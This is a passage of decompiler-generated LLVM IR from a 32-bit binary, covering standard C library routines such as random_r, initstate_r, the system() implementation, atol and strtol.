  br i1 %v6_8054018, label %dec_label_pc_805408c, label %dec_label_pc_805401a

dec_label_pc_805401a:                             ; preds = %entry
  %v1_805401a = add i32 %arg2, 8
  %v2_805401a = inttoptr i32 %v1_805401a to i32*
  %v3_805401a = load i32, i32* %v2_805401a, align 4
  store i32 %v3_805401a, i32* %ebx.global-to-local, align 4
  %v1_805401d = icmp eq i32 %v4_805400e, 0
  %v1_805401f = icmp eq i1 %v1_805401d, false
  br i1 %v1_805401f, label %dec_label_pc_8054023, label %dec_label_pc_8054021

dec_label_pc_8054021:                             ; preds = %dec_label_pc_805401a
  %v1_8054021 = and i32 %v4_805400e, -256
  %v2_8054021 = or i32 %v1_8054021, 1
  store i32 %v2_8054021, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054023

dec_label_pc_8054023:                             ; preds = %dec_label_pc_805401a, %dec_label_pc_8054021
  %v0_8054023 = phi i32 [ %v4_805400e, %dec_label_pc_805401a ], [ %v2_8054021, %dec_label_pc_8054021 ]
  %v2_8054023 = inttoptr i32 %v3_805401a to i32*
  store i32 %v0_8054023, i32* %v2_8054023, align 4
  %v1_8054025 = icmp eq i32 %v3_8054012, 0
  br i1 %v1_8054025, label %dec_label_pc_805408a, label %dec_label_pc_8054029

dec_label_pc_8054029:                             ; preds = %dec_label_pc_8054023
  %v0_8054029 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8054029, i32* %edx.global-to-local, align 4
  %v0_805402b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805402b, i32* %ecx.global-to-local, align 4
  %v0_805402d = load i32, i32* @esi, align 4
  %v1_805402d = add i32 %v0_805402d, 16
  %v2_805402d = inttoptr i32 %v1_805402d to i32*
  %v3_805402d = load i32, i32* %v2_805402d, align 4
  store i32 %v3_805402d, i32* %eax.global-to-local, align 4
  %v4_8054035 = sext i32 %v3_805402d to i64
  store i64 %v4_8054035, i64* %stack_var_-40, align 8
  %v5_805406727 = icmp sgt i32 %v3_805402d, 1
  br i1 %v5_805406727, label %dec_label_pc_805403a, label %dec_label_pc_8054069

dec_label_pc_805403a:                             ; preds = %dec_label_pc_8054029, %dec_label_pc_805403a.dec_label_pc_805403a_crit_edge
  %v0_805405e = phi i32 [ %v0_805405e.pre, %dec_label_pc_805403a.dec_label_pc_805403a_crit_edge ], [ %v0_805402b, %dec_label_pc_8054029 ]
  %v0_805403a = phi i32 [ %v0_805403a.pre, %dec_label_pc_805403a.dec_label_pc_805403a_crit_edge ], [ %v0_8054029, %dec_label_pc_8054029 ]
  %v0_805406128 = phi i32 [ %v0_8054064.pre, %dec_label_pc_805403a.dec_label_pc_805403a_crit_edge ], [ 1, %dec_label_pc_8054029 ]
  %v1_8054041 = ashr i32 %v0_805403a, 31
  %v2_8054042 = zext i32 %v0_805403a to i64
  %v4_8054042 = zext i32 %v1_8054041 to i64
  %v5_8054042 = mul nuw i64 %v4_8054042, 4294967296
  %v6_8054042 = or i64 %v5_8054042, %v2_8054042
  %v8_8054042 = sdiv i64 %v6_8054042, 127773
  %v9_8054042 = trunc i64 %v8_8054042 to i32
  %v10_8054042 = srem i64 %v6_8054042, 127773
  %v3_8054048 = mul nsw i64 %v10_8054042, 16807
  %v4_8054048 = trunc i64 %v3_8054048 to i32
  %v3_805404e = mul i32 %v9_8054042, 2836
  store i32 %v3_805404e, i32* %eax.global-to-local, align 4
  %v2_8054054 = sub i32 %v4_8054048, %v3_805404e
  %v13_8054054 = icmp slt i32 %v2_8054054, 0
  %v1_8054056 = icmp eq i1 %v13_8054054, false
  %v1_8054058 = add i32 %v2_8054054, 2147483647
  %v2_8054054.v1_8054058 = select i1 %v1_8054056, i32 %v2_8054054, i32 %v1_8054058
  store i32 %v2_8054054.v1_8054058, i32* %edx.global-to-local, align 4
  %v1_805405e = add i32 %v0_805405e, 4
  store i32 %v1_805405e, i32* %ecx.global-to-local, align 4
  %v1_8054061 = add i32 %v0_805406128, 1
  store i32 %v1_8054061, i32* @edi, align 4
  %v2_8054062 = inttoptr i32 %v1_805405e to i32*
  store i32 %v2_8054054.v1_8054058, i32* %v2_8054062, align 4
  %v0_8054064.pre = load i32, i32* @edi, align 4
  %v3_8054064.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_8054064.pre to i32
  %v5_8054067 = icmp slt i32 %v0_8054064.pre, %extract.t12
  br i1 %v5_8054067, label %dec_label_pc_805403a.dec_label_pc_805403a_crit_edge, label %dec_label_pc_8054064.dec_label_pc_8054069_crit_edge

dec_label_pc_805403a.dec_label_pc_805403a_crit_edge: ; preds = %dec_label_pc_805403a
  %v0_805403a.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_805405e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805403a

dec_label_pc_8054064.dec_label_pc_8054069_crit_edge: ; preds = %dec_label_pc_805403a
  %v0_8054069.pre = load i32, i32* @esi, align 4
  %v0_805406c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054069

dec_label_pc_8054069:                             ; preds = %dec_label_pc_8054064.dec_label_pc_8054069_crit_edge, %dec_label_pc_8054029
  %v0_805406c = phi i32 [ %v0_805406c.pre, %dec_label_pc_8054064.dec_label_pc_8054069_crit_edge ], [ %v0_805402b, %dec_label_pc_8054029 ]
  %v0_8054069 = phi i32 [ %v0_8054069.pre, %dec_label_pc_8054064.dec_label_pc_8054069_crit_edge ], [ %v0_805402d, %dec_label_pc_8054029 ]
  %v1_8054069 = add i32 %v0_8054069, 20
  %v2_8054069 = inttoptr i32 %v1_8054069 to i32*
  %v3_8054069 = load i32, i32* %v2_8054069, align 4
  store i32 %v3_8054069, i32* %eax.global-to-local, align 4
  %v2_805406c = add i32 %v0_8054069, 4
  %v3_805406c = inttoptr i32 %v2_805406c to i32*
  store i32 %v0_805406c, i32* %v3_805406c, align 4
  %v0_805406f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805406f = load i32, i32* %eax.global-to-local, align 4
  %v2_805406f = mul i32 %v1_805406f, 4
  %v3_805406f = add i32 %v2_805406f, %v0_805406f
  store i32 %v3_805406f, i32* %eax.global-to-local, align 4
  %v1_8054072 = load i32, i32* @esi, align 4
  %v2_8054072 = inttoptr i32 %v1_8054072 to i32*
  store i32 %v3_805406f, i32* %v2_8054072, align 4
  %v3_8054074 = load i64, i64* %stack_var_-40, align 8
  %v6_8054074 = mul nsw i64 %v3_8054074, 10
  %v7_8054074 = trunc i64 %v6_8054074 to i32
  %v2_805407a = ptrtoint i32* %stack_var_-20 to i32
  %v1_805408724 = add i32 %v7_8054074, -1
  %v9_805408725 = icmp slt i32 %v1_805408724, 0
  store i32 %v1_805408724, i32* @ebx, align 4
  %v1_805408826 = icmp eq i1 %v9_805408725, false
  br i1 %v1_805408826, label %dec_label_pc_805407a, label %dec_label_pc_805408a

dec_label_pc_805407a:                             ; preds = %dec_label_pc_8054069, %dec_label_pc_805407a
  store i32 %v2_805407a, i32* %eax.global-to-local, align 4
  %v0_805407f = load i32, i32* @esi, align 4
  %v2_8054080 = inttoptr i32 %v0_805407f to i32*
  %v3_8054080 = call i32 @__GI_random_r(i32* %v2_8054080, i32 %v2_805407a)
  store i32 %v0_805407f, i32* %eax.global-to-local, align 4
  store i32 %v2_805407a, i32* %edx.global-to-local, align 4
  %v0_8054087.pre = load i32, i32* @ebx, align 4
  %v1_8054087 = add i32 %v0_8054087.pre, -1
  %v9_8054087 = icmp slt i32 %v1_8054087, 0
  store i32 %v1_8054087, i32* @ebx, align 4
  %v1_8054088 = icmp eq i1 %v9_8054087, false
  br i1 %v1_8054088, label %dec_label_pc_805407a, label %dec_label_pc_805408a

dec_label_pc_805408a:                             ; preds = %dec_label_pc_8054069, %dec_label_pc_805407a, %dec_label_pc_8054023
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805408c

dec_label_pc_805408c:                             ; preds = %entry, %dec_label_pc_805408a
  %v0_805408f = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_805408a ]
  store i32 %v0_805408f, i32* %eax.global-to-local, align 4
  store i32 %v0_8054003, i32* @ebx, align 4
  store i32 %v0_8054002, i32* @esi, align 4
  store i32 %v0_8054001, i32* @edi, align 4
  store i32 %v0_8054000, i32* @ebp, align 4
  ret i32 %v0_805408f

; uselistorder directives
  uselistorder i32 %v0_805408f, { 1, 0 }
  uselistorder i32 %v1_8054087, { 1, 0 }
  uselistorder i32 %v0_8054069, { 1, 0 }
  uselistorder i32 %v0_8054064.pre, { 1, 0 }
  uselistorder i32 %v2_8054054.v1_8054058, { 1, 0 }
  uselistorder i32 %v0_805403a, { 1, 0 }
  uselistorder i32 %v0_805402b, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805408c, { 1, 0 }
  uselistorder label %dec_label_pc_805408a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805407a, { 1, 0 }
  uselistorder label %dec_label_pc_805403a, { 1, 0 }
  uselistorder label %dec_label_pc_8054023, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8054099 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_80540ba, label %dec_label_pc_80540ae

dec_label_pc_80540ae:                             ; preds = %entry
  %v2_80540ae = icmp ult i32 %arg3, 256
  %v1_80540b5 = select i1 %v2_80540ae, i32 5, i32 4
  store i32 %v1_80540b5, i32* @ebx, align 4
  br label %dec_label_pc_80540d0

dec_label_pc_80540ba:                             ; preds = %entry
  %v6_80540bd = icmp ugt i32 %arg3, 31
  br i1 %v6_80540bd, label %dec_label_pc_80540c8, label %dec_label_pc_80540bf

dec_label_pc_80540bf:                             ; preds = %dec_label_pc_80540ba
  store i32 0, i32* @ebx, align 4
  %v6_80540c4 = icmp ugt i32 %arg3, 7
  br i1 %v6_80540c4, label %dec_label_pc_80540d0, label %dec_label_pc_8054120

dec_label_pc_80540c8:                             ; preds = %dec_label_pc_80540ba
  %v2_80540c8 = icmp ult i32 %arg3, 64
  %v1_80540cd = select i1 %v2_80540c8, i32 3, i32 2
  store i32 %v1_80540cd, i32* @ebx, align 4
  br label %dec_label_pc_80540d0

dec_label_pc_80540d0:                             ; preds = %dec_label_pc_80540bf, %dec_label_pc_80540ae, %dec_label_pc_80540c8
  %v0_80540d0 = phi i32 [ 0, %dec_label_pc_80540bf ], [ %v1_80540b5, %dec_label_pc_80540ae ], [ %v1_80540cd, %dec_label_pc_80540c8 ]
  %v1_80540d0 = mul nuw nsw i32 %v0_80540d0, 4
  %v2_80540d0 = add i32 %v1_80540d0, ptrtoint (i32* @global_var_805a474.529 to i32)
  %v3_80540d0 = inttoptr i32 %v2_80540d0 to i32*
  %v4_80540d0 = load i32, i32* %v3_80540d0, align 4
  store i32 %v4_80540d0, i32* %eax.global-to-local, align 4
  %v1_80540d7 = add i32 %tmp7, 4
  store i32 %v1_80540d7, i32* @esi, align 4
  %v2_80540da = add i32 %arg4, 16
  %v3_80540da = inttoptr i32 %v2_80540da to i32*
  store i32 %v4_80540d0, i32* %v3_80540da, align 4
  %v0_80540dd = load i32, i32* @ebx, align 4
  %v1_80540dd = mul i32 %v0_80540dd, 4
  %v2_80540dd = add i32 %v1_80540dd, ptrtoint (i32* @global_var_805a460.530 to i32)
  %v3_80540dd = inttoptr i32 %v2_80540dd to i32*
  %v4_80540dd = load i32, i32* %v3_80540dd, align 4
  store i32 %v4_80540dd, i32* %edx.global-to-local, align 4
  %v0_80540e4 = load i32, i32* @esi, align 4
  %v1_80540e4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80540e4 = mul i32 %v1_80540e4, 4
  %v3_80540e4 = add i32 %v2_80540e4, %v0_80540e4
  store i32 %v3_80540e4, i32* %eax.global-to-local, align 4
  %v1_80540e7 = load i32, i32* @edi, align 4
  %v2_80540e7 = add i32 %v1_80540e7, 12
  %v3_80540e7 = inttoptr i32 %v2_80540e7 to i32*
  store i32 %v0_80540dd, i32* %v3_80540e7, align 4
  %v0_80540ea = load i32, i32* %edx.global-to-local, align 4
  %v1_80540ea = load i32, i32* @edi, align 4
  %v2_80540ea = add i32 %v1_80540ea, 20
  %v3_80540ea = inttoptr i32 %v2_80540ea to i32*
  store i32 %v0_80540ea, i32* %v3_80540ea, align 4
  %v0_80540ed = load i32, i32* %eax.global-to-local, align 4
  %v1_80540ed = load i32, i32* @edi, align 4
  %v2_80540ed = add i32 %v1_80540ed, 24
  %v3_80540ed = inttoptr i32 %v2_80540ed to i32*
  store i32 %v0_80540ed, i32* %v3_80540ed, align 4
  %v0_80540f0 = load i32, i32* @esi, align 4
  %v1_80540f0 = load i32, i32* @edi, align 4
  %v2_80540f0 = add i32 %v1_80540f0, 8
  %v3_80540f0 = inttoptr i32 %v2_80540f0 to i32*
  store i32 %v0_80540f0, i32* %v3_80540f0, align 4
  %v0_80540f3 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_80540f8 = sext i32 %arg1 to i64
  %v3_80540f8 = call i32 @srandom_r(i64 %v2_80540f8, i32 %v0_80540f3)
  %v0_80540fd = load i32, i32* @ebp, align 4
  %v1_80540fd = inttoptr i32 %v0_80540fd to i32*
  store i32 0, i32* %v1_80540fd, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054108 = load i32, i32* @ebx, align 4
  %v1_8054108 = icmp eq i32 %v0_8054108, 0
  br i1 %v1_8054108, label %dec_label_pc_8054139, label %dec_label_pc_805410c

dec_label_pc_805410c:                             ; preds = %dec_label_pc_80540d0
  %v0_805410c = load i32, i32* @edi, align 4
  %v1_805410c = add i32 %v0_805410c, 4
  %v2_805410c = inttoptr i32 %v1_805410c to i32*
  %v3_805410c = load i32, i32* %v2_805410c, align 4
  %v1_805410f = load i32, i32* @esi, align 4
  %v2_805410f = sub i32 %v3_805410c, %v1_805410f
  %v2_8054111 = sdiv i32 %v2_805410f, 4
  %v3_8054114 = mul i32 %v2_8054111, 5
  %v2_8054117 = add i32 %v3_8054114, %v0_8054108
  %v1_8054119 = load i32, i32* @ebp, align 4
  %v2_8054119 = inttoptr i32 %v1_8054119 to i32*
  store i32 %v2_8054117, i32* %v2_8054119, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054139

dec_label_pc_8054120:                             ; preds = %dec_label_pc_80540bf
  %v1_8054120 = call i32 @__errno_location(i32 %v0_8054099)
  store i32 %v1_8054120, i32* %eax.global-to-local, align 4
  %v1_8054125 = inttoptr i32 %v1_8054120 to i32*
  store i32 22, i32* %v1_8054125, align 4
  %v0_805412b = load i32, i32* %stack_var_-36, align 4
  %v1_805412b = call i32 @__errno_location(i32 %v0_805412b)
  %v1_8054130 = inttoptr i32 %v1_805412b to i32*
  store i32 22, i32* %v1_8054130, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054139

dec_label_pc_8054139:                             ; preds = %dec_label_pc_80540d0, %dec_label_pc_805410c, %dec_label_pc_8054120
  %v0_8054140 = phi i32 [ 0, %dec_label_pc_80540d0 ], [ 0, %dec_label_pc_805410c ], [ -1, %dec_label_pc_8054120 ]
  ret i32 %v0_8054140

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054139, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80540d0, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8054144 = load i32, i32* @ebx, align 4
  %v4_805414d = icmp eq i32 %arg1, 0
  br i1 %v4_805414d, label %dec_label_pc_8054270, label %dec_label_pc_8054158

dec_label_pc_8054158:                             ; preds = %entry
  %v2_805415e = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_805416d = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_805417c = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8054185 = call i32 @__vfork(i32 %v2_805417c)
  store i32 %v1_8054185, i32* @ebx, align 4
  %v2_805418f = icmp slt i32 %v1_8054185, 0
  %v2_8054192 = icmp eq i1 %v2_805418f, false
  br i1 %v2_8054192, label %dec_label_pc_80541c3, label %dec_label_pc_8054194

dec_label_pc_8054194:                             ; preds = %dec_label_pc_8054158
  %v2_805419c = call i32 @__bsd_signal(i32 3, i32 %v2_805415e)
  store i32 %v2_805415e, i32* @edx, align 4
  %v2_80541a9 = call i32 @__bsd_signal(i32 2, i32 %v2_805416d)
  store i32 2, i32* @ebx, align 4
  %v2_80541b6 = call i32 @__bsd_signal(i32 17, i32 %v2_805417c)
  br label %dec_label_pc_805426d

dec_label_pc_80541c3:                             ; preds = %dec_label_pc_8054158
  %v1_805418f = icmp eq i32 %v1_8054185, 0
  %v1_80541c3 = icmp eq i1 %v1_805418f, false
  br i1 %v1_80541c3, label %dec_label_pc_805420f, label %dec_label_pc_80541c5

dec_label_pc_80541c5:                             ; preds = %dec_label_pc_80541c3
  %v2_80541cb = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_80541d6 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_80541e1 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8054200 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805a48b.533 to i32), i32 ptrtoint ([3 x i8]* @global_var_805a490.532 to i32), i32 ptrtoint ([3 x i8]* @global_var_805a488.531 to i32), i32 %arg1, i32 0)
  %v1_805420a = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805420f:                             ; preds = %dec_label_pc_80541c3
  %v2_8054215 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054220 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8054225 = ptrtoint i32* %stack_var_-8 to i32
  %v0_805422e = load i32, i32* @ebx, align 4
  %v7_805422f = call i32 @wait4(i32 %v0_805422e, i32 %v2_8054225, i32 0, i32 0)
  %v8_8054237 = icmp eq i32 %v7_805422f, -1
  %v1_8054238 = icmp eq i1 %v8_8054237, false
  br i1 %v1_8054238, label %dec_label_pc_8054242, label %dec_label_pc_805423a

dec_label_pc_805423a:                             ; preds = %dec_label_pc_805420f
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054242

dec_label_pc_8054242:                             ; preds = %dec_label_pc_805420f, %dec_label_pc_805423a
  %v2_805424a = call i32 @__bsd_signal(i32 3, i32 %v2_805415e)
  store i32 %v2_805415e, i32* @ebx, align 4
  %v2_8054257 = call i32 @__bsd_signal(i32 2, i32 %v2_805416d)
  store i32 %v2_805416d, i32* @edx, align 4
  %v2_8054264 = call i32 @__bsd_signal(i32 17, i32 %v2_805417c)
  %v3_8054269 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805426d

dec_label_pc_805426d:                             ; preds = %dec_label_pc_8054194, %dec_label_pc_8054242
  %storemerge = phi i32 [ -1, %dec_label_pc_8054194 ], [ %v3_8054269, %dec_label_pc_8054242 ]
  br label %dec_label_pc_8054270

dec_label_pc_8054270:                             ; preds = %entry, %dec_label_pc_805426d
  %v0_8054274 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_805426d ]
  store i32 %v0_8054144, i32* @ebx, align 4
  ret i32 %v0_8054274

; uselistorder directives
  uselistorder i32 %v1_8054185, { 1, 2, 0 }
  uselistorder i32 %v2_805417c, { 1, 0, 2 }
  uselistorder i32 %v2_805416d, { 0, 2, 1 }
  uselistorder i32 %v2_805415e, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054270, { 1, 0 }
  uselistorder label %dec_label_pc_805426d, { 1, 0 }
  uselistorder label %dec_label_pc_8054242, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8054283 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8054283
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_805429d = inttoptr i32 %arg1 to i8*
  %v5_805429d = call i32 @_stdlib_strto_l(i8* %v4_805429d, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_805429d
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_80542ab = load i32, i32* @ebx, align 4
  store i32 %v0_80542ab, i32* %stack_var_-16, align 4
  %v0_80542af = load i32, i32* @global_var_805b278, align 8
  %v4_80542b5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80542b5, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_80542b5, i32* %ebx.global-to-local, align 4
  %v2_80542c241 = load i8, i8* %arg1, align 1
  %v3_80542c242 = sext i8 %v2_80542c241 to i32
  store i32 %v3_80542c242, i32* %eax.global-to-local, align 4
  %v2_80542c543 = mul nsw i32 %v3_80542c242, 2
  %v3_80542c544 = add i32 %v2_80542c543, %v0_80542af
  %v4_80542c545 = inttoptr i32 %v3_80542c544 to i8*
  %v5_80542c546 = load i8, i8* %v4_80542c545, align 1
  %v6_80542c547 = and i8 %v5_80542c546, 32
  %v7_80542c548 = icmp eq i8 %v6_80542c547, 0
  %v1_80542c949 = icmp eq i1 %v7_80542c548, false
  br i1 %v1_80542c949, label %dec_label_pc_80542c1, label %dec_label_pc_80542cb

dec_label_pc_80542c1:                             ; preds = %entry, %dec_label_pc_80542c1
  %v0_80542c150 = phi i32 [ %v1_80542c1, %dec_label_pc_80542c1 ], [ %v4_80542b5, %entry ]
  %v1_80542c1 = add i32 %v0_80542c150, 1
  store i32 %v1_80542c1, i32* %ebx.global-to-local, align 4
  %v1_80542c2 = inttoptr i32 %v1_80542c1 to i8*
  %v2_80542c2 = load i8, i8* %v1_80542c2, align 1
  %v3_80542c2 = sext i8 %v2_80542c2 to i32
  store i32 %v3_80542c2, i32* %eax.global-to-local, align 4
  %v2_80542c5 = mul nsw i32 %v3_80542c2, 2
  %v3_80542c5 = add i32 %v2_80542c5, %v0_80542af
  %v4_80542c5 = inttoptr i32 %v3_80542c5 to i8*
  %v5_80542c5 = load i8, i8* %v4_80542c5, align 1
  %v6_80542c5 = and i8 %v5_80542c5, 32
  %v7_80542c5 = icmp eq i8 %v6_80542c5, 0
  %v1_80542c9 = icmp eq i1 %v7_80542c5, false
  br i1 %v1_80542c9, label %dec_label_pc_80542c1, label %dec_label_pc_80542cb

dec_label_pc_80542cb:                             ; preds = %dec_label_pc_80542c1, %entry
  %v0_80542c1.lcssa = phi i32 [ %v4_80542b5, %entry ], [ %v1_80542c1, %dec_label_pc_80542c1 ]
  %v2_80542c2.lcssa = phi i8 [ %v2_80542c241, %entry ], [ %v2_80542c2, %dec_label_pc_80542c1 ]
  %v3_80542c2.lcssa = phi i32 [ %v3_80542c242, %entry ], [ %v3_80542c2, %dec_label_pc_80542c1 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_80542cb = icmp eq i8 %v2_80542c2.lcssa, 43
  br i1 %v9_80542cb, label %dec_label_pc_80542e0, label %dec_label_pc_80542d0

dec_label_pc_80542d0:                             ; preds = %dec_label_pc_80542cb
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_80542d2 = icmp eq i8 %v2_80542c2.lcssa, 45
  %v1_80542d5 = icmp eq i1 %v9_80542d2, false
  br i1 %v1_80542d5, label %dec_label_pc_80542e1, label %dec_label_pc_80542e0

dec_label_pc_80542e0:                             ; preds = %dec_label_pc_80542cb, %dec_label_pc_80542d0
  %storemerge3 = phi i32 [ 1, %dec_label_pc_80542d0 ], [ 0, %dec_label_pc_80542cb ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_80542e0 = add i32 %v0_80542c1.lcssa, 1
  store i32 %v1_80542e0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80542e1

dec_label_pc_80542e1:                             ; preds = %dec_label_pc_80542d0, %dec_label_pc_80542e0
  %v0_80542f3 = phi i32 [ %v0_80542c1.lcssa, %dec_label_pc_80542d0 ], [ %v1_80542e0, %dec_label_pc_80542e0 ]
  %v1_80542e3 = and i32 %arg3, -17
  %v2_80542e3 = icmp eq i32 %v1_80542e3, 0
  %v1_80542e9 = icmp eq i1 %v2_80542e3, false
  br i1 %v1_80542e9, label %dec_label_pc_805430f, label %dec_label_pc_80542eb

dec_label_pc_80542eb:                             ; preds = %dec_label_pc_80542e1
  %v1_80542eb = add i32 %arg3, 10
  store i32 %v1_80542eb, i32* %esi.global-to-local, align 4
  %v1_80542ee = inttoptr i32 %v0_80542f3 to i8*
  %v2_80542ee = load i8, i8* %v1_80542ee, align 1
  %v8_80542ee = icmp eq i8 %v2_80542ee, 48
  %v1_80542f1 = icmp eq i1 %v8_80542ee, false
  br i1 %v1_80542f1, label %dec_label_pc_8054305, label %dec_label_pc_80542f3

dec_label_pc_80542f3:                             ; preds = %dec_label_pc_80542eb
  %v1_80542f3 = add i32 %v0_80542f3, 1
  store i32 %v1_80542f3, i32* %ebx.global-to-local, align 4
  %v1_80542f4 = add i32 %arg3, 8
  store i32 %v1_80542f4, i32* %esi.global-to-local, align 4
  %v1_80542f9 = inttoptr i32 %v1_80542f3 to i8*
  %v2_80542f9 = load i8, i8* %v1_80542f9, align 1
  %v3_80542f9 = zext i8 %v2_80542f9 to i32
  %v5_80542f9 = and i32 %v3_80542c2.lcssa, -256
  %v6_80542f9 = or i32 %v5_80542f9, %v3_80542f9
  %v1_80542fb = or i32 %v6_80542f9, 32
  %v3_80542fb = trunc i32 %v1_80542fb to i8
  store i32 %v1_80542fb, i32* %eax.global-to-local, align 4
  %v10_80542fe = icmp eq i8 %v3_80542fb, 120
  %v1_8054300 = icmp eq i1 %v10_80542fe, false
  br i1 %v1_8054300, label %dec_label_pc_8054305, label %dec_label_pc_8054302

dec_label_pc_8054302:                             ; preds = %dec_label_pc_80542f3
  %v2_8054302 = mul i32 %v1_80542f4, 2
  store i32 %v2_8054302, i32* %esi.global-to-local, align 4
  %v1_8054304 = add i32 %v0_80542f3, 2
  store i32 %v1_8054304, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054305

dec_label_pc_8054305:                             ; preds = %dec_label_pc_80542f3, %dec_label_pc_80542eb, %dec_label_pc_8054302
  %v0_805432e12 = phi i32 [ %v1_80542f3, %dec_label_pc_80542f3 ], [ %v0_80542f3, %dec_label_pc_80542eb ], [ %v1_8054304, %dec_label_pc_8054302 ]
  %v0_805438520 = phi i32 [ %v1_80542f3, %dec_label_pc_80542f3 ], [ %v4_80542b5, %dec_label_pc_80542eb ], [ %v1_80542f3, %dec_label_pc_8054302 ]
  %v0_8054305 = phi i32 [ %v1_80542f4, %dec_label_pc_80542f3 ], [ %v1_80542eb, %dec_label_pc_80542eb ], [ %v2_8054302, %dec_label_pc_8054302 ]
  %v7_8054308 = icmp sgt i32 %v0_8054305, 16
  br i1 %v7_8054308, label %dec_label_pc_805430a, label %dec_label_pc_805430f

dec_label_pc_805430a:                             ; preds = %dec_label_pc_8054305
  store i32 16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805430f

dec_label_pc_805430f:                             ; preds = %dec_label_pc_8054305, %dec_label_pc_80542e1, %dec_label_pc_805430a
  %v0_805438521 = phi i32 [ %v0_805438520, %dec_label_pc_8054305 ], [ %v4_80542b5, %dec_label_pc_80542e1 ], [ %v0_805438520, %dec_label_pc_805430a ]
  %v0_805432e13 = phi i32 [ %v0_805432e12, %dec_label_pc_8054305 ], [ %v0_80542f3, %dec_label_pc_80542e1 ], [ %v0_805432e12, %dec_label_pc_805430a ]
  %v0_805431e = phi i32 [ %v0_8054305, %dec_label_pc_8054305 ], [ %arg3, %dec_label_pc_80542e1 ], [ 16, %dec_label_pc_805430a ]
  %v1_805430f = add i32 %v0_805431e, -2
  store i32 %v1_805430f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  %v6_8054317 = icmp ugt i32 %v1_805430f, 34
  br i1 %v6_8054317, label %dec_label_pc_805437a, label %dec_label_pc_8054319

